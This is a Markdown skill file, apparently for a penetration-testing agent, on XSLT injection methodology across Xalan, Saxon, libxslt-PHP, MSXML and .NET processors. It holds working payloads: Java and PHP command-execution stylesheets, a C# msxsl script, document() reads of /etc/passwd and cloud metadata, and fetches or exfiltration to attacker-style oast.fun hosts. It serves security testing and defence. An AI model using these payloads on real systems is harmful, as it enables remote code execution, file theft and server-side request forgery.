---
name: xslt-injection
description: XSLT injection — attacker-controlled stylesheets or stylesheet fragments reaching an XSLT processor, per-processor extension-function RCE (Saxon/Xalan/libxslt/MSXML/.NET), document() dual-use for file-read and SSRF, xml-stylesheet PI delivery, and the overlap/consolidation with XXE
---

# XSLT Injection

XSLT injection is the class where an attacker-controlled XSLT stylesheet or XSLT template fragment reaches an XSLT processor and executes under the processor's privilege. The primitive is **stylesheet bytes → XSLT compiler → attacker-chosen transformation**: XSLT is a Turing-complete transformation language, and its real-world processors (Saxon, Xalan, libxslt, MSXML, .NET `XslCompiledTransform`) ship extension-function APIs that reach Java reflection, PHP's full function surface, filesystem, and network. The question is never "is XSLT evaluated?" — it is "which processor is in use, what extension-function surface does it expose, and does the application fetch external stylesheets without an allowlist?"

This skill is the canonical owner of the XSLT technique surface. The sibling `xxe.md` historically carried a brief XSLT `document()` note; per the §8 Option-A consolidation, that section has been replaced by a filename pointer to this skill. XSLT and XXE overlap at the URI-resolution threat family (both reach external URIs during processing) — `xxe.md` owns XML-parse-side primitives; this skill owns XSLT-processor-side primitives.

## Attack Surface

**Transform Endpoints**
- Report generators that transform business XML to HTML/PDF via XSLT (Apache Wicket, Spring MVC `XsltView`, JasperReports, Apache FOP)
- Document-conversion pipelines (DocBook → HTML, OOXML → PDF, XML → RTF)
- SOAP/XML API responses rendered through XSLT for client-specific formatting
- SAML/OIDC federation metadata transformed to internal format

**Catalog / Portal Rendering**
- GeoNetwork metadata-catalog XSLT rendering (CVE-2026-58400)
- Content-management systems using XSLT for template rendering
- Legacy intranet portals doing server-side XSLT→HTML
- IG/standards tooling (HL7 FHIR IG publisher, veraPDF, XMLUnit test suites)

**AI/Data Processing**
- langchain-text-splitters `HTMLSectionSplitter` uses lxml XSLT for HTML section splitting
- ETL pipelines doing XML→XML transformations via Camel's XSLT component, Apache NiFi, Spring Integration

**Upload-Driven Delivery**
- File-upload surfaces that accept XML or XSL (Snipe-IT attachment API, Concrete CMS Form Block, generic document-upload)
- `xml-stylesheet` processing instruction in uploaded XML pointing to attacker-authored XSLT
- SVG/XML uploads where the renderer runs attached stylesheets

**Input Vectors**
- Direct stylesheet upload (attacker provides the entire `.xsl`)
- Partial fragment injection (user-field reaches `select=` expression in a template)
- URI reference — attacker-controlled URL to a stylesheet the server fetches
- `xml-stylesheet` processing instruction embedded in attacker-authored XML
- SAML/OIDC metadata URL reference to an attacker-authored XSLT

## Core Primitive — Attacker-Controlled Stylesheet Reaching an Extension-Function-Capable Processor

Classic exploit shape:
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="runtime" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($runtime, 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```
Primitive: Xalan with Java extension functions enabled reaches `java.lang.Runtime.exec` directly. The attacker-authored stylesheet contains the Java-reflection bytes; the processor compiles and runs. Confirmation: the response contains the exec output, or OAST hit if the command does a callback.

Not every processor exposes the same primitive — see § Per-Processor Primitive Catalog below for the differential.

### Processing Instruction Delivery

```xml
<?xml-stylesheet type="text/xsl" href="http://attacker.oast.fun/evil.xsl"?>
<rootElement>...</rootElement>
```
Upload this XML to an application that renders XML with `xml-stylesheet` PI honored (Firefox-side, some SSR engines, Concrete CMS CVE-2026-85386 class). The processor fetches the attacker-authored XSLT and executes it. The injection point is the upload surface; the primitive is the full XSLT attack set.

## Per-Processor Primitive Catalog

Each XSLT processor has distinct extension-function APIs. The relevant 2024–2026 primitive surface:

### Apache Xalan (Java)

- **Namespace format:** `xmlns:java-prefix="http://xml.apache.org/xalan/java/fully.qualified.class.Name"` — binds a namespace to a specific Java class.
- **Function call:** `java-prefix:methodName($arg)` for static methods; instance methods call `java-prefix:methodName($instance, $arg)`.
- **Primitives reachable:**
  - `java.lang.Runtime.getRuntime().exec(cmd)` → direct RCE
  - `java.io.FileReader` / `java.io.FileInputStream` → file read
  - `java.net.URL.openStream` → SSRF
  - `javax.script.ScriptEngineManager` → nested JS execution (NashornJS, Rhino)
- **Default hardening:** Xalan's `FEATURE_SECURE_PROCESSING = true` disables Java extension functions. Applications must set this on the TransformerFactory.
- **Fingerprint:** error messages reference `org.apache.xalan.*`; `xmlns:xalan="http://xml.apache.org/xalan"` namespace recognized.

### Saxonica Saxon (HE/PE/EE)

- **HE (Home Edition):** Java extension functions **disabled by default**. XPath 2.0/3.0 standard functions only — reach is `doc()`/`unparsed-text()`/`fn:environment-variable()`/`fn:system-property()`.
- **PE (Professional Edition) and EE (Enterprise Edition):** Java extension functions enabled if `ALLOW_EXTERNAL_FUNCTIONS=true` (Saxon config feature). When enabled:
  - **Namespace format:** `xmlns:Runtime="java:java.lang.Runtime"` or `xmlns:java="http://saxon.sf.net/java-type"`.
  - **Function call:** `Runtime:exec(Runtime:getRuntime(), 'cmd')`.
  - **Primitives reachable:** full Java reflection, same shape as Xalan.
- **Saxon-specific extensions:** `saxon:evaluate(string)` evaluates an XPath expression constructed at runtime (XPath-side injection primitive); `saxon:parse(string)` parses an XML string.
- **Default hardening:** Saxon-HE: safe by default. Saxon-PE/EE: `ALLOW_EXTERNAL_FUNCTIONS=false` must be set explicitly.
- **Fingerprint:** error messages reference `net.sf.saxon.*`; `xmlns:saxon="http://saxon.sf.net/"` namespace recognized.

### libxslt (C library — PHP, Python lxml, Ruby Nokogiri, Node libxmljs)

- **Namespace format for extensions:** `xmlns:php="http://php.net/xsl"` for the PHP binding, no equivalent for Python/Ruby/Node by default.
- **`php:function` primitive (libxslt-PHP only):**
  ```xml
  <xsl:value-of select="php:function('system', 'id')"/>
  ```
  Reaches any PHP function when `XSLTProcessor::registerPHPFunctions()` is called. The method's `functions` parameter defaults to null — passing no argument enables access to **all** PHP functions. Primitives:
  - `php:function('system', $cmd)` → shell exec (PHP < 8.0 and 8.0+)
  - `php:function('assert', $code)` → arbitrary PHP code execution (**PHP < 8.0 only** — PHP 8.0+ removed assert's string-eval behavior)
  - `php:function('readfile', $path)` → file read
  - `php:function('file_put_contents', $path, $data)` → file write
- **libxslt native primitives (no PHP):** `document('URL')` is the primary external-reach function; `php:function` is PHP-binding-only.
- **Default hardening:** `XSLT_SECPREF_WRITE_FILE`, `XSLT_SECPREF_READ_FILE`, `XSLT_SECPREF_CREATE_DIRECTORY`, `XSLT_SECPREF_READ_NETWORK` can be set via `xsltSetCtxtSecurityPrefs`. libxslt 1.1.37+ tightened entity resolution.
- **Fingerprint:** error messages reference `libxslt` or `xslt_runtime`.

### MSXML 6 (Windows COM)

- **Extension functions:** disabled by default. XSLT 2.0 features limited.
- **`document()`:** disabled by default in MSXML 6; enabled via `XMLDOMDocument.resolveExternals = true`.
- **Fingerprint:** Windows-side XML errors with MSXML references.
- **Primitives reachable:** largely bounded to in-document XSLT; `document()` only when the processor is misconfigured.

### .NET `XslCompiledTransform` and `XsltSettings`

- **Default hardening:** `XsltSettings` default: `EnableDocumentFunction = false`, `EnableScript = false`. Both must be set to `true` for `document()` or script elements to work.
- **`<msxsl:script>`:** when `EnableScript = true`, `<msxsl:script language="C#" ...>` embeds C# code in the stylesheet. Primitive: direct C# code execution during transformation.
  ```xml
  <msxsl:script language="C#" implements-prefix="user" xmlns:msxsl="urn:schemas-microsoft-com:xslt">
    <![CDATA[
      public string exec(string cmd) {
        return System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd).ToString();
      }
    ]]>
  </msxsl:script>
  <xsl:value-of select="user:exec('whoami')"/>
  ```
- **Fingerprint:** .NET-side errors; namespace `urn:schemas-microsoft-com:xslt` for msxsl.

### Spring Framework XsltView

- **Mechanism:** `XsltView` is a Spring MVC `View` implementation that renders XML models through XSLT. CVE-2026-47884 (CVSS 9.8) covers the class where Spring MVC with `"/**"` mapping that results in view rendering, and view name not explicitly specified, lets an attacker-controlled path reach `XsltView` with attacker-chosen URL as the view resource — a Spring-mediated SSRF-and-potentially-RCE primitive.
- **Reach:** depends on the underlying XSLT processor configured in Spring; typically Xalan or Saxon.

## document() Dual-Use — File Read and SSRF

The XSLT 1.0 and 2.0 `document()` function fetches external resources:
```xml
<xsl:value-of select="document('file:///etc/passwd')"/>
<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
<xsl:value-of select="document('http://xyz.oast.fun/exfil?' || string(/path/to/data))"/>
```
Primitives:
- **File read:** `file://` URI. Response is parsed as XML by default — fails on non-XML content silently in some processors, loudly in others. For raw-text reach, use `unparsed-text()` (XPath 2.0/3.0) or `fn:unparsed-text-lines()`.
- **SSRF:** any HTTP(S) URI. Full request made by the XSLT processor's HTTP stack — same proxy/metadata-reach semantics as general SSRF. Route to `ssrf.md` for the egress-reach matrix.
- **OAST exfil:** URI with target-data in query string. Processor DNS-resolves and HTTP-fetches; both channels are exfil-usable.

**Dual-use with XXE:** both `document()` and the XML parser's external-entity resolution reach URIs during processing. Historical confusion in CVE descriptions ("XXE in XSLT transform") typically refers to either (a) the XML document being transformed having an external entity in its DTD (parse-side XXE — route to `xxe.md`) or (b) the XSLT stylesheet using `document()` with an attacker-controlled URI (XSLT-side — this skill). The owning skill for each path:

| Mechanism | Owner |
|---|---|
| XML parser resolves external entity in the input document's DTD | `xxe.md` |
| XSLT `document()` function fetches external URI during transformation | this skill |
| XSLT `unparsed-text()` fetches raw-text URI (XPath 3.0) | this skill |
| XSLT processor `TransformerFactory` created without `FEATURE_SECURE_PROCESSING` → both parse-side and XSLT-side risk | both — primary attack vector determines write-up |

## XSLT 1.0 vs 2.0 / 3.0 Differentials

| Feature | 1.0 | 2.0 | 3.0 |
|---|---|---|---|
| `document()` | yes (XSLT native) | yes | yes |
| `unparsed-text()` | no | yes (text file read) | yes + `-available()`/`-lines()` |
| `fn:environment-variable()` | no | no | yes (env read) |
| Regex functions (`matches`, `replace`, `tokenize`) | no | yes | yes |
| XSLT scripting elements (`xsl:evaluate` for dynamic XPath) | no | no | yes |
| Higher-order functions | no | no | yes |
| XPath `function-lookup` | no | no | yes (reflection) |
| XQuery compatibility | no | partial | full subset |

For injection purposes:
- XSLT 1.0 limits to `document()` + extension functions (Xalan/Saxon-PE/libxslt-PHP). Reach bounded to those surfaces.
- XSLT 2.0 adds `unparsed-text()` for raw file read.
- XSLT 3.0 adds dynamic XPath evaluation via `xsl:evaluate`, higher-order functions, and `function-lookup` for reflection.

Processor-version differentials:
- Xalan: XSLT 1.0 + Xalan extensions (Java reflection).
- Saxon-HE: XSLT 3.0 + standard functions only.
- Saxon-PE/EE: XSLT 3.0 + Java reflection (opt-in).
- libxslt: XSLT 1.0 + libxslt-PHP's `php:function` (PHP binding only).
- MSXML 6: XSLT 1.0 + MSXML-specific extensions (disabled by default).
- .NET XslCompiledTransform: XSLT 1.0 + `<msxsl:script>` (opt-in).

## Confirmation Primitive Ladder

| Rung | Primitive | Observed signal | What it proves |
|---|---|---|---|
| 0 | `<xsl:value-of select="7*7"/>` or `select="7*7"` | `49` reflected | XSLT compilation+execution confirmed (not template echo) |
| 1 | `fn:system-property('xsl:vendor')` | vendor string | Processor fingerprinted (Saxonica, Apache, libxml2, Microsoft) |
| 2 | `document('http://xyz.oast.fun/x')` | DNS/HTTP hit on OAST | External URI reach — SSRF primitive from XSLT |
| 3 | `document('file:///etc/passwd')` reflected | file contents | Local file-read primitive |
| 4 | `<xsl:value-of select="rt:exec(rt:getRuntime(), 'id')" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"/>` | exec output reflected | Xalan Java-reflection RCE |
| 5 | Saxon `Runtime:exec(Runtime:getRuntime(), 'id')` with `xmlns:Runtime="java:java.lang.Runtime"` | exec output reflected | Saxon-PE/EE RCE (requires ALLOW_EXTERNAL_FUNCTIONS=true) |
| 6 | libxslt-PHP `php:function('system', 'id')` with `xmlns:php="http://php.net/xsl"` | exec output reflected | libxslt-PHP RCE (requires registerPHPFunctions() called) |
| 7 | .NET `<msxsl:script language="C#">` reaching `System.Diagnostics.Process.Start` | reflected process output | .NET RCE (requires XsltSettings.EnableScript=true) |

## Detection Channels

### Reflected

A render endpoint that returns the transformed document. Inject a simple XSLT:
```xml
<xsl:template match="/"><result><xsl:value-of select="7*7"/></result></xsl:template>
```
Confirmation: output includes `<result>49</result>`. The reflected `49` from `7*7` is the classic SSTI/XSLT primitive.

### Error-Message

Each processor emits distinctive errors:
- Xalan: `org.apache.xalan.*` or `javax.xml.transform.TransformerException`
- Saxon: `net.sf.saxon.trans.XPathException` with codes `XTDE1340`, `XTDE1360`, etc.
- libxslt: `xsltApplyStylesheet` + specific error message
- .NET: `System.Xml.Xsl.XsltException` with `XslTransformException` wrapping

A 500 containing any of these strings confirms the processor family and the sink type.

### OAST via document()

```xml
<xsl:value-of select="document('http://xyz.oast.fun/x')"/>
```
A DNS/HTTP hit on OAST confirms `document()` reach. Routes to `ssrf.md`.

### Time-Based

```xml
<xsl:value-of select="document('http://slow.oast.fun/5s')"/>
```
A 5-second response delta confirms external URI fetch. Noisy; prefer OAST where available.

## Testing Methodology

1. **Identify the processor.** Fingerprint via error message, `fn:system-property('xsl:vendor')`, or the application's declared stack (Java vs Python vs PHP vs .NET).
2. **Payload the reflected `7*7` primitive.** Confirms XSLT evaluation. If the input is a `select=` expression context, use `select="7*7"`. If the input is a full stylesheet, use the template-shape above.
3. **Test for extension-function reach.** For Xalan: `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` + `rt:getRuntime()`. For Saxon-PE/EE: `xmlns:Runtime="java:java.lang.Runtime"`. For libxslt-PHP: `xmlns:php="http://php.net/xsl"` + `php:function('system', 'id')`. For .NET: `<msxsl:script>` with embedded C#.
4. **Test for `document()` reach.** `document('http://xyz.oast.fun/x')` — OAST confirmation.
5. **Test for file-read.** `document('file:///etc/passwd')` or `unparsed-text('file:///etc/passwd')` (XPath 2.0+).
6. **For `xml-stylesheet` PI delivery, upload XML pointing to attacker XSLT.** The upload surface is the injection point; the XSLT is attacker-authored externally.
7. **Match processor to version for CVE pivots.** Spring MVC's `XsltView` has CVE-2026-47884 — if the application is Spring + XsltView + `/**` mapping, that primitive is directly applicable.

## Validation

A finding is XSLT injection only if:
- **The reflected `7*7 → 49` confirms XSLT compilation.** Not a template echo, not a literal reflection — a computed arithmetic result.
- **The processor identity matches the extension-function primitive.** Firing Xalan Java-reflection against a libxslt backend fails because the Java-namespace is foreign. Match before firing.
- **For `document()` claims, the OAST hit arrives within the request window.** Delayed hits suggest unrelated scanner traffic.
- **For extension-function RCE claims, the exec output is confirmed.** A simple `id` command returning `uid=` is the direct signal.
- **For `xml-stylesheet` PI delivery claims, the server actually honors the PI.** Many renderers ignore the PI for security; confirmation requires observing the processor fetch the attacker-authored XSLT.

## False Positives

- **A `7*7` payload reflected as `"7*7"` literally.** The engine did not evaluate; the sink is a template with no XSLT backing or XSLT is disabled.
- **A 500 error from any XML input.** Many XML parsers reject syntactically-invalid XML with a generic error; the sink may not be XSLT at all.
- **A reflection of attacker-authored XSLT bytes in the response.** The server stored or echoed the stylesheet without executing it.
- **A `document()` claim where the response contains the file path, not the file contents.** The processor rejected the URI; the content may still be reflected (via a different sink), but the primitive did not fire.
- **A `<msxsl:script>` payload against a non-.NET backend.** The msxsl namespace is .NET-specific; firing against Xalan or Saxon fails cleanly.
- **An extension-function RCE claim without a specific processor+version anchor.** Xalan's `FEATURE_SECURE_PROCESSING=true` disables Java extensions; Saxon-HE never had them. Verify the processor is in a configuration that permits the primitive.

## Impact and Chaining

**Direct impact.**
- **Full RCE** via Xalan Java reflection, Saxon-PE/EE `java:*` extensions, libxslt-PHP `php:function`, .NET `<msxsl:script>`. The exec runs as the application server process identity.
- **Arbitrary file read** via `document('file://...')` or `unparsed-text('file://...')`.
- **SSRF** via `document('http://...')` — same reach as general SSRF.
- **XXE via XSLT pipeline** — the TransformerFactory shared with the XML parser may be insecure for both XSLT and XML parsing. Route to `xxe.md` for the parse-side primitives.
- **Information disclosure** via `fn:environment-variable()` (Saxon XPath 3.0 standard).

**Upstream enablers.**
- Attacker-controlled stylesheet source — upload surface, URI reference, XSLT fragment reaching `select=`.
- Processor configured without `FEATURE_SECURE_PROCESSING` (JAXP standard for Java-side) or equivalent (Saxon's `ALLOW_EXTERNAL_FUNCTIONS=false`, libxslt's security preferences, MSXML's `resolveExternals=false`).
- Spring MVC `"/**"` mapping with view-name auto-resolution (CVE-2026-47884 class).

**Downstream.**
- `rce.md` — direct host code execution via extension functions.
- `ssrf.md` — `document()` reach.
- `path_traversal_lfi_rfi.md` — file-read primitive via `document()` or `unparsed-text()`.
- `xxe.md` — parse-side XXE where TransformerFactory is insecure for both.
- `information_disclosure.md` — env dump via XPath 3.0 standard function.
- `insecure_file_uploads.md` — upload of attacker XSLT or XML-with-PI as the delivery mechanism.

**Composite chains.**
- *Upload → xml-stylesheet PI → XSLT RCE.* Attacker uploads XML with `<?xml-stylesheet href="http://attacker/evil.xsl"?>`; the renderer fetches evil.xsl, which uses Xalan Java reflection to run `id`. Route: `insecure_file_uploads.md` (upload) → this file (XSLT exec) → `rce.md` (post-exec).
- *Spring XsltView path mapping → RCE.* CVE-2026-47884 class — `/**` mapping routes attacker path to a view that resolves to an attacker-controlled XSLT URI. Route: this file (primitive) → `rce.md`.
- *XSLT document() → cloud metadata.* `document('http://169.254.169.254/latest/meta-data/')` reaches IMDSv1 metadata. Route: this file → `cloud/aws_metadata.md` for credential extraction.
- *Catalog XSLT RCE → cross-tenant exfil.* GeoNetwork CVE-2026-58400 — Saxon with `ALLOW_EXTERNAL_FUNCTIONS` and attacker-reached stylesheet. Route: this file → `rce.md` + `information_disclosure.md`.

## Pro Tips

- **Processor fingerprint is the first move.** The Java-reflection namespace format varies: Xalan uses `http://xml.apache.org/xalan/java/`; Saxon uses `java:` or `http://saxon.sf.net/java-type`. Firing the wrong namespace against the wrong processor fails silently.
- **Saxon-HE is bounded; Saxon-PE/EE with `ALLOW_EXTERNAL_FUNCTIONS=true` is unbounded.** The library name alone narrows the primitive set. Saxonica's commercial editions ship with the dangerous default enabled only on specific build configurations.
- **libxslt-PHP's `php:function` requires `XSLTProcessor::registerPHPFunctions()` to have been called.** Grep PHP targets for the function name; the finding is the API being called at all. The historical `assert()` string-eval primitive is PHP < 8.0 only.
- **`FEATURE_SECURE_PROCESSING` is cross-cutting.** Java's JAXP standard flag disables both external DTD resolution and most dangerous XSLT behaviors. CVE-2024-36522 (Apache Wicket) and CVE-2024-31573 (XMLUnit) both fix by enabling this feature by default; applications that override to `false` re-expose.
- **`xml-stylesheet` PI delivery is upload-driven.** The injection point is the file upload; the XSLT is externally hosted. Where an upload surface allows XML, test for PI honoring.
- **Spring XsltView CVE-2026-47884 is 5.3.x through 7.0.x.** The affected Spring Framework range is enormous — any Spring MVC application with `"/**"` mapping and XsltView is a candidate.
- **Allure Framework CVE-2025-52888 is XXE via XSLT, not XSLT-injection.** The report-tool's XSLT path reaches external entity resolution; mitigation is a custom `ClasspathEntityResolver` with `setValidating(false)`. The mechanism owner is `xxe.md`.

## Tooling

- **Burp Suite** — Scanner picks up classic `7*7` reflection; extensions `active-scan++` add XSLT probe families.
- **Saxon-HE CLI** (`java -jar Saxon-HE.jar`) — reproduce payloads locally against the pinned processor version.
- **Xalan CLI** (`java -jar xalan.jar`) — reproduce Xalan primitives.
- **libxslt CLI** (`xsltproc`) — Unix tool for libxslt-side payloads.
- **PowerShell / System.Xml.Xsl** — .NET side testing.
- **xmlstarlet** — command-line XML + XSLT for crafting payloads.
- **Interactsh** — OAST confirmation for `document()` reach.

## Summary

XSLT injection reaches a Turing-complete transformation language running under the application's process identity, with per-processor extension-function APIs that unlock Java reflection (Xalan, Saxon-PE/EE), PHP's full function surface (libxslt-PHP's `php:function`), direct C# scripting (.NET `<msxsl:script>`), filesystem (`document('file://...')`, `unparsed-text()`), and network (`document('http://...')` — overlapping with SSRF). The processor identity determines the primitive set — Saxon-HE is bounded, Saxon-PE/EE and Xalan with `ALLOW_EXTERNAL_FUNCTIONS` are unbounded. Delivery is direct (attacker-uploaded `.xsl`), partial (field reaches `select=`), referenced (attacker-controlled stylesheet URL), or PI-based (XML with `<?xml-stylesheet href="attacker/evil.xsl"?>`). This skill consolidates the XSLT material formerly in `xxe.md § XSLT Document`; `xxe.md` now carries a pointer here. The two deep siblings carry the full technique surface: `xslt_injection_advanced_deep.md` owns per-processor extension-function depth, embedded-scripting primitives, XSLT 2.0/3.0 function abuse, Spring XsltView mechanism class, and WAF/filter bypass; `xslt_injection_novel_deep.md` owns the 2024–2026 CVE catalogue (Wicket, Spring XsltView, GeoNetwork, HAPI FHIR cluster, IBM DataStage, Camel Quarkus, libxslt UAFs, Firefox XSLT UAFs, XMLUnit, Snipe-IT, Concrete CMS, langchain-text-splitters).
